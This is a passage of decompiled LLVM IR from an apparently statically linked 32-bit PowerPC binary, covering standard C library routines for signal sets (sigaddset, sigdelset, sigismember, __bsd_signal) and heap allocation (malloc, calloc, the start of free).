  store i32 %v3_1001ecdc, i32* %r0.global-to-local, align 4
  %v2_1001ece0 = inttoptr i32 %v0_1001ecbc to i32*
  store i32 %v3_1001ecdc, i32* %v2_1001ece0, align 4
  store i32 268561640, i32* @lr, align 4
  %v0_1001ece4 = call i32 @memcpy()
  store i32 %tmp6, i32* @r9, align 4
  %v1_1001ecf0 = load i32, i32* @r30, align 4
  %v2_1001ecf0 = add i32 %v1_1001ecf0, 136
  %v3_1001ecf0 = inttoptr i32 %v2_1001ecf0 to i32*
  store i32 %tmp6, i32* %v3_1001ecf0, align 4
  %v0_1001ecf4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001ecf4 = load i32, i32* @r30, align 4
  %v2_1001ecf4 = add i32 %v1_1001ecf4, 132
  %v3_1001ecf4 = inttoptr i32 %v2_1001ecf4 to i32*
  store i32 %v0_1001ecf4, i32* %v3_1001ecf4, align 4
  %v0_1001ecfc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001ecf8

dec_label_pc_1001ecf8:                            ; preds = %dec_label_pc_1001eccc, %dec_label_pc_1001ec9c, %dec_label_pc_1001ecdc
  %v0_1001ecfc = phi i32 [ %v0_1001ecb8, %dec_label_pc_1001eccc ], [ %v0_1001ecb8, %dec_label_pc_1001ec9c ], [ %v0_1001ecfc.pre, %dec_label_pc_1001ecdc ]
  store i32 %v0_1001ec50, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001ecfc

; uselistorder directives
  uselistorder i32 %v0_1001ecb8, { 0, 1, 3, 2 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder label %dec_label_pc_1001ecf8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001ec9c, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1001ed40, label %dec_label_pc_1001ed2c

dec_label_pc_1001ed2c:                            ; preds = %entry
  %v0_1001ed2c = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1001ed38 = inttoptr i32 %v0_1001ed2c to i32*
  store i32 22, i32* %v2_1001ed38, align 4
  %v0_1001ed4c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ed48

dec_label_pc_1001ed40:                            ; preds = %entry
  %v0_1001ed40 = call i32 @__sigaddset()
  store i32 %v0_1001ed40, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ed48

dec_label_pc_1001ed48:                            ; preds = %dec_label_pc_1001ed2c, %dec_label_pc_1001ed40
  %v0_1001ed4c = phi i32 [ %v0_1001ed4c.pre, %dec_label_pc_1001ed2c ], [ %v0_1001ed40, %dec_label_pc_1001ed40 ]
  ret i32 %v0_1001ed4c

; uselistorder directives
  uselistorder label %dec_label_pc_1001ed48, { 1, 0 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1001ed8c, label %dec_label_pc_1001ed78

dec_label_pc_1001ed78:                            ; preds = %entry
  %v0_1001ed78 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1001ed84 = inttoptr i32 %v0_1001ed78 to i32*
  store i32 22, i32* %v2_1001ed84, align 4
  %v0_1001ed98.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ed94

dec_label_pc_1001ed8c:                            ; preds = %entry
  %v0_1001ed8c = call i32 @__sigdelset()
  store i32 %v0_1001ed8c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ed94

dec_label_pc_1001ed94:                            ; preds = %dec_label_pc_1001ed78, %dec_label_pc_1001ed8c
  %v0_1001ed98 = phi i32 [ %v0_1001ed98.pre, %dec_label_pc_1001ed78 ], [ %v0_1001ed8c, %dec_label_pc_1001ed8c ]
  ret i32 %v0_1001ed98

; uselistorder directives
  uselistorder label %dec_label_pc_1001ed94, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268561856, i32* @lr, align 4
  %v0_1001edbc = call i32 @__GI_memset()
  ret i32 0
}

define i32 @sigfillset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 255, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268561900, i32* @lr, align 4
  %v0_1001ede8 = call i32 @__GI_memset()
  ret i32 0
}

define i32 @sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1001ee30, label %dec_label_pc_1001ee1c

dec_label_pc_1001ee1c:                            ; preds = %entry
  %v0_1001ee1c = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1001ee28 = inttoptr i32 %v0_1001ee1c to i32*
  store i32 22, i32* %v2_1001ee28, align 4
  %v0_1001ee3c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ee38

dec_label_pc_1001ee30:                            ; preds = %entry
  %v0_1001ee30 = call i32 @__sigismember()
  store i32 %v0_1001ee30, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ee38

dec_label_pc_1001ee38:                            ; preds = %dec_label_pc_1001ee1c, %dec_label_pc_1001ee30
  %v0_1001ee3c = phi i32 [ %v0_1001ee3c.pre, %dec_label_pc_1001ee1c ], [ %v0_1001ee30, %dec_label_pc_1001ee30 ]
  ret i32 %v0_1001ee3c

; uselistorder directives
  uselistorder label %dec_label_pc_1001ee38, { 1, 0 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %v0_1001ee54 = load i32, i32* @r4, align 4
  %v3_1001ee54 = icmp eq i32 %v0_1001ee54, 0
  %v0_1001ee58 = load i32, i32* @r3, align 4
  %v0_1001ee60 = load i32, i32* @r31, align 4
  store i32 %v0_1001ee58, i32* @r31, align 4
  br i1 %v3_1001ee54, label %dec_label_pc_1001ee84, label %dec_label_pc_1001ee74

dec_label_pc_1001ee74:                            ; preds = %entry
  %v1_1001ee58 = add i32 %v0_1001ee58, 452
  store i32 ptrtoint (i32* @global_var_1001ee78.1232 to i32), i32* @lr, align 4
  %v3_1001ee74 = call i32 @__GI_sigprocmask(i32 0, i32 0, i32 %v1_1001ee58)
  %v3_1001ee7c = icmp eq i32 %v3_1001ee74, 0
  br i1 %v3_1001ee7c, label %dec_label_pc_1001ee88, label %dec_label_pc_1001ee84

dec_label_pc_1001ee84:                            ; preds = %dec_label_pc_1001ee74, %entry
  br label %dec_label_pc_1001ee88

dec_label_pc_1001ee88:                            ; preds = %dec_label_pc_1001ee74, %dec_label_pc_1001ee84
  %v0_1001ee88 = phi i32 [ 1, %dec_label_pc_1001ee74 ], [ 0, %dec_label_pc_1001ee84 ]
  %v1_1001ee88 = load i32, i32* @r31, align 4
  %v2_1001ee88 = add i32 %v1_1001ee88, 448
  %v3_1001ee88 = inttoptr i32 %v2_1001ee88 to i32*
  store i32 %v0_1001ee88, i32* %v3_1001ee88, align 4
  store i32 %v0_1001ee60, i32* @r31, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1001ee58, { 1, 0 }
  uselistorder i32 448, { 2, 0, 1 }
  uselistorder i32 452, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001ee88, { 1, 0 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1001eeac = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1001eeac, label %dec_label_pc_1001eed0, label %dec_label_pc_1001eec0

dec_label_pc_1001eec0:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1001eed0, label %dec_label_pc_1001eec8

dec_label_pc_1001eec8:                            ; preds = %dec_label_pc_1001eec0
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1001ef00.lr.ph, label %dec_label_pc_1001eed0

dec_label_pc_1001eed0:                            ; preds = %dec_label_pc_1001eec8, %dec_label_pc_1001eec0, %entry
  %v0_1001eed0 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1001eedc = inttoptr i32 %v0_1001eed0 to i32*
  store i32 22, i32* %v2_1001eedc, align 4
  %v0_1001ef70.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ef6c

dec_label_pc_1001ef00.lr.ph:                      ; preds = %dec_label_pc_1001eec8
  %v2_1001eef0 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1001eef0, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001ef0022 = add i32 %v2_1001eef0, 128
  %v3_1001ef0023 = inttoptr i32 %v2_1001ef0022 to i32*
  store i32 0, i32* %v3_1001ef0023, align 4
  %v0_1001ef0424 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001ef0425 = add i32 %v0_1001ef0424, -1
  store i32 %v1_1001ef0425, i32* %r11.global-to-local, align 4
  %v1_1001ef0826 = mul i32 %v1_1001ef0425, 4
  %v1_1001ef0c27 = load i32, i32* @r8, align 4
  %v2_1001ef0c28 = add i32 %v1_1001ef0c27, %v1_1001ef0826
  store i32 %v2_1001ef0c28, i32* %r9.global-to-local, align 4
  %v0_1001ef1029 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001ef1030 = add i32 %v0_1001ef1029, -1
  store i32 %v1_1001ef1030, i32* %ctr.global-to-local, align 4
  %v2_1001ef1031 = icmp eq i32 %v1_1001ef1030, 0
  br i1 %v2_1001ef1031, label %dec_label_pc_1001ef14, label %dec_label_pc_1001ef00.dec_label_pc_1001ef00_crit_edge

dec_label_pc_1001ef00.dec_label_pc_1001ef00_crit_edge: ; preds = %dec_label_pc_1001ef00.lr.ph, %dec_label_pc_1001ef00.dec_label_pc_1001ef00_crit_edge
  %v2_1001ef0c32 = phi i32 [ %v2_1001ef0c, %dec_label_pc_1001ef00.dec_label_pc_1001ef00_crit_edge ], [ %v2_1001ef0c28, %dec_label_pc_1001ef00.lr.ph ]
  %v0_1001ef00.pre = load i32, i32* @r10, align 4
  %v2_1001ef00 = add i32 %v2_1001ef0c32, 4
  %v3_1001ef00 = inttoptr i32 %v2_1001ef00 to i32*
  store i32 %v0_1001ef00.pre, i32* %v3_1001ef00, align 4
  %v0_1001ef04 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001ef04 = add i32 %v0_1001ef04, -1
  store i32 %v1_1001ef04, i32* %r11.global-to-local, align 4
  %v1_1001ef08 = mul i32 %v1_1001ef04, 4
  %v1_1001ef0c = load i32, i32* @r8, align 4
  %v2_1001ef0c = add i32 %v1_1001ef0c, %v1_1001ef08
  store i32 %v2_1001ef0c, i32* %r9.global-to-local, align 4
  %v0_1001ef10 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001ef10 = add i32 %v0_1001ef10, -1
  store i32 %v1_1001ef10, i32* %ctr.global-to-local, align 4
  %v2_1001ef10 = icmp eq i32 %v1_1001ef10, 0
  br i1 %v2_1001ef10, label %dec_label_pc_1001ef14, label %dec_label_pc_1001ef00.dec_label_pc_1001ef00_crit_edge

dec_label_pc_1001ef14:                            ; preds = %dec_label_pc_1001ef00.dec_label_pc_1001ef00_crit_edge, %dec_label_pc_1001ef00.lr.ph
  %v0_1001ef18.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1001ef14 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1001ef14, i32* @r3, align 4
  store i32 %v0_1001ef18.pre, i32* @r4, align 4
  %v0_1001ef1c = call i32 @__sigaddset()
  %v1_1001ef20 = icmp slt i32 %v0_1001ef1c, 0
  br i1 %v1_1001ef20, label %dec_label_pc_1001ef68, label %dec_label_pc_1001ef28

dec_label_pc_1001ef28:                            ; preds = %dec_label_pc_1001ef14
  %v0_1001ef2c = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_1001ef2c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1004eda0.1234 to i32), i32* @r3, align 4
  %v0_1001ef34 = call i32 @__sigismember()
  %v2_1001ef40 = ptrtoint i32* %stack_var_-156 to i32
  store i32 268562264, i32* @lr, align 4
  %v4_1001ef54 = call i32 @__GI_sigaction(i32 %v0_1001ef2c, i32* nonnull %stack_var_-296, i32 %v2_1001ef40)
  %v1_1001ef58 = icmp slt i32 %v4_1001ef54, 0
  br i1 %v1_1001ef58, label %dec_label_pc_1001ef68, label %dec_label_pc_1001ef60

dec_label_pc_1001ef60:                            ; preds = %dec_label_pc_1001ef28
  %v3_1001ef60 = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1001ef60, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ef6c

dec_label_pc_1001ef68:                            ; preds = %dec_label_pc_1001ef28, %dec_label_pc_1001ef14
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ef6c

dec_label_pc_1001ef6c:                            ; preds = %dec_label_pc_1001ef60, %dec_label_pc_1001eed0, %dec_label_pc_1001ef68
  %v0_1001ef70 = phi i32 [ %v3_1001ef60, %dec_label_pc_1001ef60 ], [ %v0_1001ef70.pre, %dec_label_pc_1001eed0 ], [ -1, %dec_label_pc_1001ef68 ]
  ret i32 %v0_1001ef70

; uselistorder directives
  uselistorder i32 %v1_1001ef10, { 1, 0 }
  uselistorder i32 %v2_1001ef0c, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 2, 0, 1 }
  uselistorder i32 65, { 1, 2, 6, 8, 9, 7, 4, 5, 3, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001ef6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001ef00.dec_label_pc_1001ef00_crit_edge, { 1, 0 }
}

define i32 @__sigismember() local_unnamed_addr {
entry:
  %v0_1001ef84 = load i32, i32* @r4, align 4
  %v1_1001ef84 = add i32 %v0_1001ef84, -1
  %v1_1001ef88 = call i32 @__asm_rlwinm(i32 %v1_1001ef84, i32 29, i32 3, i32 29)
  %v1_1001ef8c = urem i32 %v1_1001ef84, 32
  %v0_1001ef90 = load i32, i32* @r3, align 4
  %v2_1001ef90 = add i32 %v0_1001ef90, %v1_1001ef88
  %v3_1001ef90 = inttoptr i32 %v2_1001ef90 to i32*
  %v4_1001ef90 = load i32, i32* %v3_1001ef90, align 4
  %v3_1001ef98 = shl i32 1, %v1_1001ef8c
  %v2_1001ef9c = and i32 %v4_1001ef90, %v3_1001ef98
  %v2_1001efa0 = icmp ne i32 %v2_1001ef9c, 0
  %v5_1001efa4 = zext i1 %v2_1001efa0 to i32
  ret i32 %v5_1001efa4
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1001efac = load i32, i32* @r4, align 4
  %v1_1001efac = add i32 %v0_1001efac, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1001efb4 = call i32 @__asm_rlwinm(i32 %v1_1001efac, i32 29, i32 3, i32 29)
  store i32 %v1_1001efb4, i32* @r11, align 4
  %v1_1001efb8 = urem i32 %v1_1001efac, 32
  %v1_1001efbc = load i32, i32* @r3, align 4
  %v2_1001efbc = add i32 %v1_1001efbc, %v1_1001efb4
  %v3_1001efbc = inttoptr i32 %v2_1001efbc to i32*
  %v4_1001efbc = load i32, i32* %v3_1001efbc, align 4
  %v0_1001efc0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1001efc0 = shl i32 %v0_1001efc0, %v1_1001efb8
  store i32 %v3_1001efc0, i32* %r0.global-to-local, align 4
  %v2_1001efc4 = or i32 %v3_1001efc0, %v4_1001efbc
  store i32 %v2_1001efc4, i32* %v3_1001efbc, align 4
  ret i32 0
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1001efd4 = load i32, i32* @r4, align 4
  %v1_1001efd4 = add i32 %v0_1001efd4, -1
  store i32 -2, i32* %r0.global-to-local, align 4
  %v1_1001efdc = call i32 @__asm_rlwinm(i32 %v1_1001efd4, i32 29, i32 3, i32 29)
  store i32 %v1_1001efdc, i32* @r11, align 4
  %v1_1001efe0 = urem i32 %v1_1001efd4, 32
  %v1_1001efe4 = load i32, i32* @r3, align 4
  %v2_1001efe4 = add i32 %v1_1001efe4, %v1_1001efdc
  %v3_1001efe4 = inttoptr i32 %v2_1001efe4 to i32*
  %v4_1001efe4 = load i32, i32* %v3_1001efe4, align 4
  %v0_1001efe8 = load i32, i32* %r0.global-to-local, align 4
  %v3_1001efe8 = shl i32 %v0_1001efe8, %v1_1001efe0
  %v4_1001efe8 = sub nsw i32 32, %v1_1001efe0
  %v5_1001efe8 = lshr i32 %v0_1001efe8, %v4_1001efe8
  %v6_1001efe8 = or i32 %v5_1001efe8, %v3_1001efe8
  store i32 %v6_1001efe8, i32* %r0.global-to-local, align 4
  %v2_1001efec = and i32 %v6_1001efe8, %v4_1001efe4
  store i32 %v2_1001efec, i32* %v3_1001efe4, align 4
  ret i32 0
}

define i32 @malloc() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1001f004 = load i32, i32* @r3, align 4
  %v3_1001f004 = icmp eq i32 %v0_1001f004, 0
  br i1 %v3_1001f004, label %dec_label_pc_1001f014, label %dec_label_pc_1001f018

dec_label_pc_1001f014:                            ; preds = %entry
  br label %dec_label_pc_1001f018

dec_label_pc_1001f018:                            ; preds = %entry, %dec_label_pc_1001f014
  %v0_1001f028 = phi i32 [ 1, %dec_label_pc_1001f014 ], [ %v0_1001f004, %entry ]
  %v3_1001f01c = icmp ugt i32 %v0_1001f028, -8
  br i1 %v3_1001f01c, label %dec_label_pc_1001f12c, label %dec_label_pc_1001f024

dec_label_pc_1001f024:                            ; preds = %dec_label_pc_1001f018
  %v1_1001f028 = add i32 %v0_1001f028, 4
  store i32 ptrtoint (i32* @global_var_1004da14.970 to i32), i32* @r29, align 4
  store i32 %v1_1001f028, i32* %stack_var_-40, align 4
  store i32 268562492, i32* @lr, align 4
  %v1_1001f038 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004da14.970 to i32))
  %v2_1001f040 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1001f048 = call i32 @__heap_alloc(i32* inttoptr (i32 268718384 to i32*), i32 %v2_1001f040)
  store i32 %v3_1001f048, i32* @r31, align 4
  %v0_1001f050 = load i32, i32* @r29, align 4
  store i32 %v0_1001f050, i32* @r3, align 4
  store i32 268562520, i32* @lr, align 4
  %v0_1001f054 = call i32 @pthread_mutex_unlock()
  %v0_1001f058 = load i32, i32* @r31, align 4
  %v3_1001f058 = icmp eq i32 %v0_1001f058, 0
  br i1 %v3_1001f058, label %dec_label_pc_1001f060, label %dec_label_pc_1001f110.thread

dec_label_pc_1001f110.thread:                     ; preds = %dec_label_pc_1001f024
  br label %dec_label_pc_1001f124

dec_label_pc_1001f060:                            ; preds = %dec_label_pc_1001f024
  %v3_1001f064 = load i32, i32* @global_var_10045234.1005, align 4
  %v3_1001f068 = load i32, i32* %stack_var_-40, align 4
  %v2_1001f06c = icmp ult i32 %v3_1001f068, %v3_1001f064
  br i1 %v2_1001f06c, label %dec_label_pc_1001f084, label %dec_label_pc_1001f074

dec_label_pc_1001f074:                            ; preds = %dec_label_pc_1001f060
  %v2_1001f074 = add i32 %v3_1001f064, -1
  %v1_1001f07c = add i32 %v2_1001f074, %v3_1001f068
  br label %dec_label_pc_1001f084

dec_label_pc_1001f084:                            ; preds = %dec_label_pc_1001f060, %dec_label_pc_1001f074
  %storemerge = phi i32 [ %v1_1001f07c, %dec_label_pc_1001f074 ], [ %v3_1001f068, %dec_label_pc_1001f060 ]
  store i32 %storemerge, i32* @r9, align 4
  store i32 268562580, i32* @lr, align 4
  %v1_1001f090 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004ee20.969 to i32))
  %v0_1001f094 = load i32, i32* @r31, align 4
  store i32 268562588, i32* @lr, align 4
  %v1_1001f098 = call i32 @__GI_sbrk(i32 %v0_1001f094)
  %v3_1001f09c = icmp eq i32 %v1_1001f098, -1
  br i1 %v3_1001f09c, label %dec_label_pc_1001f0bc, label %dec_label_pc_1001f0a4

dec_label_pc_1001f0a4:                            ; preds = %dec_label_pc_1001f084
  %v1_1001f0a4 = add i32 %v1_1001f098, 3
  %v1_1001f0a8 = call i32 @__asm_rlwinm(i32 %v1_1001f0a4, i32 0, i32 0, i32 29)
  store i32 %v1_1001f0a8, i32* @r30, align 4
  %v4_1001f0ac = icmp eq i32 %v1_1001f0a8, %v1_1001f098
  br i1 %v4_1001f0ac, label %dec_label_pc_1001f0bc, label %dec_label_pc_1001f0b4

dec_label_pc_1001f0b4:                            ; preds = %dec_label_pc_1001f0a4
  %v2_1001f0b4 = sub i32 %v1_1001f0a8, %v1_1001f098
  store i32 268562620, i32* @lr, align 4
  %v1_1001f0b8 = call i32 @__GI_sbrk(i32 %v2_1001f0b4)
  br label %dec_label_pc_1001f0bc

dec_label_pc_1001f0bc:                            ; preds = %dec_label_pc_1001f0a4, %dec_label_pc_1001f084, %dec_label_pc_1001f0b4
  store i32 ptrtoint (i32* @global_var_1004ee20.969 to i32), i32* @r3, align 4
  store i32 268562632, i32* @lr, align 4
  %v0_1001f0c4 = call i32 @pthread_mutex_unlock()
  %v0_1001f0c8 = load i32, i32* @r30, align 4
  %v3_1001f0c8 = icmp eq i32 %v0_1001f0c8, -1
  br i1 %v3_1001f0c8, label %dec_label_pc_1001f12c, label %dec_label_pc_1001f110

dec_label_pc_1001f110:                            ; preds = %dec_label_pc_1001f0bc
  store i32 ptrtoint (i32* @global_var_1004da14.970 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10045130 to i32), i32* @r29, align 4
  store i32 268562664, i32* @lr, align 4
  %v1_1001f0e4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004da14.970 to i32))
  %v0_1001f0e8 = load i32, i32* @r31, align 4
  %v0_1001f0ec = load i32, i32* @r30, align 4
  %v0_1001f0f0 = load i32, i32* @r29, align 4
  store i32 268562680, i32* @lr, align 4
  %v3_1001f0f4 = inttoptr i32 %v0_1001f0f0 to i32*
  %v4_1001f0f4 = call i32 @__heap_free(i32* %v3_1001f0f4, i32 %v0_1001f0ec, i32 %v0_1001f0e8)
  %v0_1001f0f8 = load i32, i32* @r29, align 4
  %v2_1001f100 = inttoptr i32 %v0_1001f0f8 to i32*
  %v3_1001f100 = call i32 @__heap_alloc(i32* %v2_1001f100, i32 %v2_1001f040)
  store i32 %v3_1001f100, i32* @r31, align 4
  %v0_1001f108 = load i32, i32* @r28, align 4
  store i32 %v0_1001f108, i32* @r3, align 4
  store i32 268562704, i32* @lr, align 4
  %v0_1001f10c = call i32 @pthread_mutex_unlock()
  %v0_1001f110.pre = load i32, i32* @r31, align 4
  %v3_1001f110 = icmp eq i32 %v0_1001f110.pre, 0
  br i1 %v3_1001f110, label %dec_label_pc_1001f124.thread, label %dec_label_pc_1001f124

dec_label_pc_1001f124.thread:                     ; preds = %dec_label_pc_1001f110
  br label %dec_label_pc_1001f12c

dec_label_pc_1001f124:                            ; preds = %dec_label_pc_1001f110, %dec_label_pc_1001f110.thread
  %v0_1001f124.pr6 = phi i32 [ %v0_1001f058, %dec_label_pc_1001f110.thread ], [ %v0_1001f110.pre, %dec_label_pc_1001f110 ]
  %v3_1001f118 = load i32, i32* %stack_var_-40, align 4
  %v2_1001f11c = inttoptr i32 %v0_1001f124.pr6 to i32*
  store i32 %v3_1001f118, i32* %v2_1001f11c, align 4
  %v0_1001f120 = load i32, i32* @r31, align 4
  %v1_1001f120 = add i32 %v0_1001f120, 4
  store i32 %v1_1001f120, i32* @r31, align 4
  %v3_1001f124 = icmp eq i32 %v1_1001f120, 0
  br i1 %v3_1001f124, label %dec_label_pc_1001f12c, label %dec_label_pc_1001f13c

dec_label_pc_1001f12c:                            ; preds = %dec_label_pc_1001f124.thread, %dec_label_pc_1001f124, %dec_label_pc_1001f0bc, %dec_label_pc_1001f018
  %v0_1001f12c = call i32 @__errno_location()
  %v2_1001f134 = inttoptr i32 %v0_1001f12c to i32*
  store i32 12, i32* %v2_1001f134, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1001f13c

dec_label_pc_1001f13c:                            ; preds = %dec_label_pc_1001f124, %dec_label_pc_1001f12c
  %v0_1001f140 = phi i32 [ %v1_1001f120, %dec_label_pc_1001f124 ], [ 0, %dec_label_pc_1001f12c ]
  ret i32 %v0_1001f140

; uselistorder directives
  uselistorder i32 %v1_1001f120, { 1, 0, 2 }
  uselistorder i32 %v0_1001f110.pre, { 1, 0 }
  uselistorder i32 %v1_1001f0a8, { 1, 0, 2 }
  uselistorder i32 %v1_1001f098, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1001f13c, { 1, 0 }
  uselistorder label %dec_label_pc_1001f12c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1001f0bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001f084, { 1, 0 }
  uselistorder label %dec_label_pc_1001f018, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1001f15c = icmp eq i32 %arg1, 0
  %v2_1001f164 = mul i32 %arg2, %arg1
  store i32 %v2_1001f164, i32* @r31, align 4
  br i1 %v3_1001f15c, label %dec_label_pc_1001f190, label %dec_label_pc_1001f170

dec_label_pc_1001f170:                            ; preds = %entry
  %v2_1001f170 = udiv i32 %v2_1001f164, %arg1
  store i32 0, i32* @r30, align 4
  %v4_1001f178 = icmp eq i32 %v2_1001f170, %arg2
  br i1 %v4_1001f178, label %dec_label_pc_1001f190, label %dec_label_pc_1001f180

dec_label_pc_1001f180:                            ; preds = %dec_label_pc_1001f170
  %v0_1001f180 = call i32 @__errno_location()
  %v2_1001f188 = inttoptr i32 %v0_1001f180 to i32*
  store i32 12, i32* %v2_1001f188, align 4
  br label %dec_label_pc_1001f1ac

dec_label_pc_1001f190:                            ; preds = %dec_label_pc_1001f170, %entry
  store i32 %v2_1001f164, i32* @r3, align 4
  store i32 268562840, i32* @lr, align 4
  %v0_1001f194 = call i32 @malloc()
  store i32 %v0_1001f194, i32* @r3, align 4
  %v0_1001f198 = load i32, i32* @r31, align 4
  store i32 %v0_1001f198, i32* @r5, align 4
  store i32 %v0_1001f194, i32* @r30, align 4
  %v3_1001f19c = icmp eq i32 %v0_1001f194, 0
  store i32 0, i32* @r4, align 4
  br i1 %v3_1001f19c, label %dec_label_pc_1001f1ac, label %dec_label_pc_1001f1a8

dec_label_pc_1001f1a8:                            ; preds = %dec_label_pc_1001f190
  store i32 268562860, i32* @lr, align 4
  %v0_1001f1a8 = call i32 @__GI_memset()
  br label %dec_label_pc_1001f1ac

dec_label_pc_1001f1ac:                            ; preds = %dec_label_pc_1001f190, %dec_label_pc_1001f180, %dec_label_pc_1001f1a8
  %v0_1001f1b0 = load i32, i32* @r30, align 4
  ret i32 %v0_1001f1b0

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001f1ac, { 2, 0, 1 }
}

define i32 @free() local_unnamed_addr {
entry:
  %v0_1001f1cc = load i32, i32* @r3, align 4
  %v3_1001f1cc = icmp eq i32 %v0_1001f1cc, 0
  br i1 %v3_1001f1cc, label %dec_label_pc_1001f2b0, label %dec_label_pc_1001f1dc

dec_label_pc_1001f1dc:                            ; preds = %entry
  %v1_1001f1e0 = add i32 %v0_1001f1cc, -4
  %v2_1001f1e0 = inttoptr i32 %v1_1001f1e0 to i32*
  %v3_1001f1e0 = load i32, i32* %v2_1001f1e0, align 4
  store i32 %v3_1001f1e0, i32* @r28, align 4
  store i32 %v1_1001f1e0, i32* @r29, align 4
  store i32 268697600, i32* @r26, align 4
  store i32 268562936, i32* @lr, align 4
  %v1_1001f1f4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004da14.970 to i32))
  %v0_1001f1f8 = load i32, i32* @r29, align 4
  %v0_1001f1fc = load i32, i32* @r28, align 4
  store i32 268562952, i32* @lr, align 4
  %v4_1001f204 = call i32 @__heap_free(i32* nonnull @global_var_10045130, i32 %v0_1001f1f8, i32 %v0_1001f1fc)
  store i32 268697600, i32* @r9, align 4
